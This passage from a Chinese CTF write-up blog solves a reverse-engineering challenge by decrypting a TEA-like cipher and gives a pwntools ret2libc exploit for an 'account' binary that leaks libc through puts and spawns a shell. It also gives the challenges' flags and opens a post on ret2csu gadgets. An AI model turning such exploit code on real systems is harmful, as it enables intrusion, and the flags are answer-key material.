45890C408BC0458Bh, 0E845C7FCh, 8BE1017503746DEBh, 0E0458BE44501EC45h</span><br><span class="line">.text:0000000000001250                 dq 0F0458BC28904E0C1h, 458BE0558B020C8Dh, 8BCA89C131D001E4h</span><br><span class="line">.text:0000000000001268                 dq 8BC18905E8C1E045h, 4533D031C801F445h, 0C1DC458BDC4501E4h</span><br><span class="line">.text:0000000000001280                 dq 8DF8458BC28904E0h, 0E4458BDC558B020Ch, 458BCA89C131D001h</span><br><span class="line">.text:0000000000001298                 dq 458BC18905E8C1DCh, 0E44533D031C801FCh, 8301E84583E04501h</span><br><span class="line">.text:00000000000012B0                 dq 7503748D761FE87Dh, 48C001D8458BE101h, 85148D4898h, 0C20148C8458B4800h</span><br><span class="line">.text:00000000000012D0                 dq 0D8458B0289DC458Bh, 1C083489848C001h, 85148D48h, 8BC20148C8458B48h</span><br><span class="line">.text:00000000000012F0                 dq 1D845830289E045h, 0FEC88E0F03D87D83h, 0C35DC8458B48FFFFh</span><br></pre></td></tr></table></figure>



<p>重新加载后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:0000563C791E1308 main:                                   ; DATA XREF: start+21↑o</span><br><span class="line">.text:0000563C791E1308 ; __unwind &#123; // 563C791E0000</span><br><span class="line">.text:0000563C791E1308                 endbr64</span><br><span class="line">.text:0000563C791E130C                 push    rbp</span><br><span class="line">.text:0000563C791E130D                 mov     rbp, rsp</span><br><span class="line">.text:0000563C791E1310                 sub     rsp, 70h</span><br><span class="line">.text:0000563C791E1314                 mov     rax, fs:28h</span><br><span class="line">.text:0000563C791E131D                 mov     [rbp-8], rax</span><br><span class="line">.text:0000563C791E1321                 xor     eax, eax</span><br><span class="line">.text:0000563C791E1323                 mov     dword ptr [rbp-60h], 2</span><br><span class="line">.text:0000563C791E132A                 mov     dword ptr [rbp-5Ch], 0</span><br><span class="line">.text:0000563C791E1331                 mov     dword ptr [rbp-58h], 2</span><br><span class="line">.text:0000563C791E1338                 mov     dword ptr [rbp-54h], 2</span><br><span class="line">.text:0000563C791E133F                 mov     qword ptr [rbp-30h], 0</span><br><span class="line">.text:0000563C791E1347                 mov     qword ptr [rbp-28h], 0</span><br><span class="line">.text:0000563C791E134F                 mov     qword ptr [rbp-20h], 0</span><br><span class="line">.text:0000563C791E1357                 mov     qword ptr [rbp-18h], 0</span><br><span class="line">.text:0000563C791E135F                 jz      short loc_563C791E1364</span><br><span class="line">.text:0000563C791E1361                 jnz     short loc_563C791E1364</span><br><span class="line">.text:0000563C791E1361 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000563C791E1363                 db 0E1h</span><br><span class="line">.text:0000563C791E1364 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000563C791E1364</span><br><span class="line">.text:0000563C791E1364 loc_563C791E1364:                       ; CODE XREF: .text:0000563C791E135F↑j</span><br><span class="line">.text:0000563C791E1364                                         ; .text:0000563C791E1361↑j</span><br><span class="line">.text:0000563C791E1364                 mov     dword ptr [rbp-50h], 569A1C45h</span><br><span class="line">.text:0000563C791E136B                 mov     dword ptr [rbp-4Ch], 0EF2C6A10h</span><br><span class="line">.text:0000563C791E1372                 mov     dword ptr [rbp-48h], 0FB440BD6h</span><br><span class="line">.text:0000563C791E1379                 mov     dword ptr [rbp-44h], 5797F41Dh</span><br><span class="line">.text:0000563C791E1380                 mov     dword ptr [rbp-40h], 523FF2C3h</span><br><span class="line">.text:0000563C791E1387                 mov     dword ptr [rbp-3Ch], 48337CD9h</span><br><span class="line">.text:0000563C791E138E                 mov     dword ptr [rbp-38h], 3616AC2Dh</span><br><span class="line">.text:0000563C791E1395                 mov     dword ptr [rbp-34h], 6B6312Dh</span><br><span class="line">.text:0000563C791E139C                 lea     rdi, aPlsInputFlag ; &quot;Pls input flag&quot;</span><br><span class="line">.text:0000563C791E13A3                 call    _puts</span><br><span class="line">.text:0000563C791E13A8                 lea     rax, [rbp-30h]</span><br><span class="line">.text:0000563C791E13AC                 mov     edx, 20h ; &#x27; &#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">.text:000055E1FCA101A9                 endbr64</span><br><span class="line">.text:000055E1FCA101AD                 push    rbp</span><br><span class="line">.text:000055E1FCA101AE                 mov     rbp, rsp</span><br><span class="line">.text:000055E1FCA101B1                 mov     [rbp-38h], rdi</span><br><span class="line">.text:000055E1FCA101B5                 mov     [rbp-40h], rsi</span><br><span class="line">.text:000055E1FCA101B9                 jz      short loc_55E1FCA101BE</span><br><span class="line">.text:000055E1FCA101BB                 jnz     short loc_55E1FCA101BE</span><br><span class="line">.text:000055E1FCA101BB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055E1FCA101BD                 db 0E1h    //nop</span><br><span class="line">.text:000055E1FCA101BE ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055E1FCA101BE</span><br><span class="line">.text:000055E1FCA101BE loc_55E1FCA101BE:                       ; CODE XREF: .text:000055E1FCA101B9↑j</span><br><span class="line">.text:000055E1FCA101BE                                         ; .text:000055E1FCA101BB↑j</span><br><span class="line">.text:000055E1FCA101BE                 mov     dword ptr [rbp-28h], 0</span><br><span class="line">.text:000055E1FCA101C5                 jmp     loc_55E1FCA102F8</span><br><span class="line">.text:000055E1FCA101CA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055E1FCA101CA</span><br><span class="line">.text:000055E1FCA101CA loc_55E1FCA101CA:                       ; CODE XREF: .text:000055E1FCA102FC↓j</span><br><span class="line">.text:000055E1FCA101CA                 mov     eax, [rbp-28h]</span><br><span class="line">.text:000055E1FCA101CD                 add     eax, eax</span><br><span class="line">.text:000055E1FCA101CF                 cdqe</span><br><span class="line">.text:000055E1FCA101D1                 lea     rdx, ds:0[rax*4]</span><br><span class="line">.text:000055E1FCA101D9                 mov     rax, [rbp-38h]</span><br><span class="line">.text:000055E1FCA101DD                 add     rax, rdx</span><br><span class="line">.text:000055E1FCA101E0                 mov     eax, [rax]</span><br><span class="line">.text:000055E1FCA101E2                 mov     [rbp-24h], eax</span><br><span class="line">.text:000055E1FCA101E5                 mov     eax, [rbp-28h]</span><br><span class="line">.text:000055E1FCA101E8                 add     eax, eax</span><br><span class="line">.text:000055E1FCA101EA                 cdqe</span><br><span class="line">.text:000055E1FCA101EC                 add     rax, 1</span><br><span class="line">.text:000055E1FCA101F0                 lea     rdx, ds:0[rax*4]</span><br><span class="line">.text:000055E1FCA101F8                 mov     rax, [rbp-38h]</span><br><span class="line">.text:000055E1FCA101FC                 add     rax, rdx</span><br><span class="line">.text:000055E1FCA101FF                 mov     eax, [rax]</span><br><span class="line">.text:000055E1FCA10201                 mov     [rbp-20h], eax</span><br><span class="line">.text:000055E1FCA10204                 mov     dword ptr [rbp-1Ch], 0</span><br><span class="line">.text:000055E1FCA1020B                 mov     dword ptr [rbp-14h], 897354D2h</span><br><span class="line">.text:000055E1FCA10212                 mov     rax, [rbp-40h]</span><br><span class="line">.text:000055E1FCA10216                 mov     eax, [rax]</span><br><span class="line">.text:000055E1FCA10218                 mov     [rbp-10h], eax</span><br><span class="line">.text:000055E1FCA1021B                 mov     rax, [rbp-40h]</span><br><span class="line">.text:000055E1FCA1021F                 mov     eax, [rax+4]</span><br><span class="line">.text:000055E1FCA10222                 mov     [rbp-0Ch], eax</span><br><span class="line">.text:000055E1FCA10225                 mov     rax, [rbp-40h]</span><br><span class="line">.text:000055E1FCA10229                 mov     eax, [rax+8]</span><br><span class="line">.text:000055E1FCA1022C                 mov     [rbp-8], eax</span><br><span class="line">.text:000055E1FCA1022F                 mov     rax, [rbp-40h]</span><br><span class="line">.text:000055E1FCA10233                 mov     eax, [rax+0Ch]</span><br><span class="line">.text:000055E1FCA10236                 mov     [rbp-4], eax</span><br><span class="line">.text:000055E1FCA10239                 mov     dword ptr [rbp-18h], 0</span><br><span class="line">.text:000055E1FCA10240                 jmp     short loc_55E1FCA102AF</span><br></pre></td></tr></table></figure>

<p>把类似这样的nop(在汇编标出) ，P重定义，tab就得到伪代码了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000055E1FCA101BB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055E1FCA101BD                 db 0E1h    //nop</span><br><span class="line">.text:000055E1FCA101BE ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>ok,现在可以给exp了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_encrypt</span>():</span><br><span class="line">    <span class="comment"># 目标值（处理后的结果），来自v7数组，转换为32位无符号整数</span></span><br><span class="line">    v7 = [</span><br><span class="line">        <span class="number">1452940357</span>,</span><br><span class="line">        -<span class="number">282301936</span>,</span><br><span class="line">        -<span class="number">79426602</span>,</span><br><span class="line">        <span class="number">1469576221</span>,</span><br><span class="line">        <span class="number">1379922627</span>,</span><br><span class="line">        <span class="number">1211333849</span>,</span><br><span class="line">        <span class="number">907455533</span>,</span><br><span class="line">        <span class="number">112603437</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将v7转换为32位无符号整数，并按对分组</span></span><br><span class="line">    targets = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>):</span><br><span class="line">        v3_final = v7[i] &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v4_final = v7[i + <span class="number">1</span>] &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        targets.append((v3_final, v4_final))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># a2数组的值，固定为[2, 0, 2, 2]</span></span><br><span class="line">    a2 = [<span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>]</span><br><span class="line">    initial_pairs = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对每对目标值进行逆向计算</span></span><br><span class="line">    <span class="keyword">for</span> (target_v3, target_v4) <span class="keyword">in</span> targets:</span><br><span class="line">        current_v3 = target_v3</span><br><span class="line">        current_v4 = target_v4</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 逆向32步加密过程（从第31步到第0步）</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">32</span>)):  <span class="comment"># j = 31, 30, ..., 0</span></span><br><span class="line">            <span class="comment"># 计算当前步骤的v5值</span></span><br><span class="line">            v5 = (-<span class="number">1988930350</span>) * (j + <span class="number">1</span>)</span><br><span class="line">            v5 &amp;= <span class="number">0xFFFFFFFF</span>  <span class="comment"># 保持32位有符号整数特性</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算delta_v4，用于还原v4的上一步值</span></span><br><span class="line">            term1 = v5</span><br><span class="line">            term2 = (current_v3 + v5) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            term3 = (<span class="number">16</span> * current_v3 + a2[<span class="number">2</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            term4 = ((current_v3 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">3</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            delta_v4 = (term1 ^ term2 ^ term3 ^ term4) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 还原上一步的v4</span></span><br><span class="line">            prev_v4 = (current_v4 - delta_v4) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算delta_v3，用于还原v3的上一步值</span></span><br><span class="line">            term1_v3 = v5</span><br><span class="line">            term2_v3 = (prev_v4 + v5) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            term3_v3 = (<span class="number">16</span> * prev_v4 + a2[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            term4_v3 = ((prev_v4 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">1</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            delta_v3 = (term1_v3 ^ term2_v3 ^ term3_v3 ^ term4_v3) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 还原上一步的v3</span></span><br><span class="line">            prev_v3 = (current_v3 - delta_v3) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新当前值，准备下一步逆向</span></span><br><span class="line">            current_v3, current_v4 = prev_v3, prev_v4</span><br><span class="line"></span><br><span class="line">        initial_pairs.append((current_v3, current_v4))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将初始值转换为字节（小端序，符合x86架构）</span></span><br><span class="line">    flag_bytes = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> v3, v4 <span class="keyword">in</span> initial_pairs:</span><br><span class="line">        flag_bytes += v3.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        flag_bytes += v4.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取并打印flag</span></span><br><span class="line">flag = reverse_encrypt()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: b3d06a66f8aa86e3e6390f615e389e55</span><br></pre></td></tr></table></figure>



<h2 id="account"><a href="#account" class="headerlink" title="account"></a>account</h2><p>注意一下到了v12要将其覆盖成13就可以了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义自定义函数以匹配图片中的代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">s</span>): <span class="keyword">return</span> p.recvuntil(s)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">s</span>): <span class="keyword">return</span> p.sendline(s)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> p.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rn</span>(<span class="params">n</span>): <span class="keyword">return</span> p.recvn(n)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ia</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理32位地址的符号问题（与图片完全一致）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stre</span>(<span class="params">val</span>): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(val &amp; <span class="number">0xffffffff</span>).encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程</span></span><br><span class="line">p = process(<span class="string">&#x27;./account&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./account&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一阶段：泄露libc地址（与图片完全一致）</span></span><br><span class="line">ru(<span class="string">b&quot;Enter your bill, enter 0 to exit:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    sl(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;13&#x27;</span>)</span><br><span class="line">sl(stre(<span class="number">0x080490B0</span>))   <span class="comment"># puts@plt</span></span><br><span class="line">sl(stre(elf.sym[<span class="string">&#x27;vul&#x27;</span>]))    <span class="comment"># vul函数地址</span></span><br><span class="line">sl(stre(<span class="number">0x0804C014</span>))   <span class="comment"># puts@got</span></span><br><span class="line">sl(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl()  <span class="comment"># 接收&quot;Recording completed&quot;行</span></span><br><span class="line">libc_base = u32(rn(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二阶段：获取shell（与图片完全一致）</span></span><br><span class="line">ru(<span class="string">b&quot;Enter your bill, enter 0 to exit:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    sl(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;13&#x27;</span>)</span><br><span class="line">sl(stre(system_addr - <span class="number">0x100000000</span>))  <span class="comment"># 负数技巧</span></span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)  <span class="comment"># 任意返回地址</span></span><br><span class="line">sl(stre(binsh_addr - <span class="number">0x100000000</span>))   <span class="comment"># 负数技巧</span></span><br><span class="line">sl(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()  <span class="comment"># 进入交互模式</span></span><br></pre></td></tr></table></figure>





<h3 id="多重Caesar密码"><a href="#多重Caesar密码" class="headerlink" title="多重Caesar密码"></a>多重Caesar密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myfz&#123;hrpa_pfxddi_ypgm_xxcqkwyj_dkzcvz_2025&#125;</span><br></pre></td></tr></table></figure>

<p>我当时写的时候</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">myfz&#123;hrpa_pfxddi_ypgm_xxcqkwyj_dkzcvz_2025&#125;</span><br><span class="line">flag      caesar</span><br><span class="line"></span><br><span class="line">m y  f  z h r p a p  f x  d   d   i</span><br><span class="line">f l  a  g         c  a e  s   a   r</span><br><span class="line">7 13 5  19        13 5 19 -15 -3  -17</span><br></pre></td></tr></table></figure>

<p>我把’-‘算计去了，结果以为循环是 7 13 5 19 -15 -3 -17,没解出来了。</p>
<p>看有的师傅用ai深度研究梭哈了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;easy_caesar_with_multiple_shifts_2025&#125;</span><br></pre></td></tr></table></figure>






      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/08/04/ret2csu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/08/04/ret2csu/" class="post-title-link" itemprop="url">ret2csu</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-08-04 09:28:23" itemprop="dateCreated datePublished" datetime="2025-08-04T09:28:23+08:00">2025-08-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 20:57:19" itemprop="dateModified" datetime="2025-09-23T20:57:19+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/ret2csu/" itemprop="url" rel="index"><span itemprop="name">ret2csu</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>原理学习：</p>
<p>什么时候用？</p>
<p>找不到简单指令（如 <code>pop rdi; ret</code>, <code>pop rsi; ret</code>, <code>pop rdx; ret</code>）的情况下。</p>
<p>所以我们看到_libc_csu_init这个函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401250 __libc_csu_init proc near               ; DATA XREF: _start+1A↑o</span><br><span class="line">.text:0000000000401250 ; __unwind &#123;</span><br><span class="line">.text:0000000000401250                 endbr64</span><br><span class="line">.text:0000000000401254                 push    r15</span><br><span class="line">.text:0000000000401256                 lea     r15, __frame_dummy_init_array_entry</span><br><span class="line">.text:000000000040125D                 push    r14</span><br><span class="line">.text:000000000040125F                 mov     r14, rdx   </span><br><span class="line">.text:0000000000401262                 push    r13</span><br><span class="line">.text:0000000000401264                 mov     r13, rsi  </span><br><span class="line">.text:0000000000401267                 push    r12</span><br><span class="line">.text:0000000000401269                 mov     r12d, edi   </span><br><span class="line">.text:000000000040126C                 push    rbp</span><br><span class="line">.text:000000000040126D                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000401274                 push    rbx</span><br><span class="line">.text:0000000000401275                 sub     rbp, r15</span><br><span class="line">.text:0000000000401278                 sub     rsp, 8</span><br><span class="line">.text:000000000040127C                 call    _init_proc</span><br><span class="line">.text:0000000000401281                 sar     rbp, 3</span><br><span class="line">.text:0000000000401285                 jz      short loc_4012A6</span><br><span class="line">.text:0000000000401287                 xor     ebx, ebx</span><br><span class="line">.text:0000000000401289                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000401290</span><br><span class="line">.text:0000000000401290 loc_401290:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000401290                 mov     rdx, r14 //rdx = r14</span><br><span class="line">.text:0000000000401293                 mov     rsi, r13 //rsi = r13</span><br><span class="line">.text:0000000000401296                 mov     edi, r12d //edi = r12d</span><br><span class="line">.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:000000000040129D                 add     rbx, 1</span><br><span class="line">.text:00000000004012A1                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004012A4                 jnz     short loc_401290</span><br><span class="line">.text:00000000004012A6</span><br><span class="line">.text:00000000004012A6 loc_4012A6:                             ; CODE XREF: __libc_csu_init+35↑j</span><br><span class="line">.text:00000000004012A6                 